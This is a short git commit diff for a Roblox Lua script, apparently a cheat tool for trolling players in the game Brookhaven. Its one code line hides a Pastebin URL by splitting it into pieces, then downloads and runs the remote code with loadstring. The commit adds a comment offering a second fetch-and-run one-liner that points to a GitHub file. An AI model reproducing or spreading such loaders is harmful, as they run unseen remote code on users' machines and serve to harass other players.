1df21e15d5b4205814e3a8b5b5a864b4ea1da5ed
Darkluax-main-account <pradezjj@gmail.com>
2026-04-27 14:55:54 +0800

    Update Brookhaventrollplayers.lua

--- Brookhaventrollplayers.lua
+++ Brookhaventrollplayers.lua
@@ -1,1 +1,3 @@
 local _="https://pastebin"local __=".com/raw/"local ___="54zm6Hhc"(loadstring or load)(game:HttpGet(_..__..___))()
+--- IF YOU MAKING THIS SCRIPT INTO LOADSTRING NAH, JUST COPY THIS THING
+--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Darkluax-main-account/Darktroller-sSyetemGuiscript/refs/heads/main/Brookhaventrollplayers.lua"))()
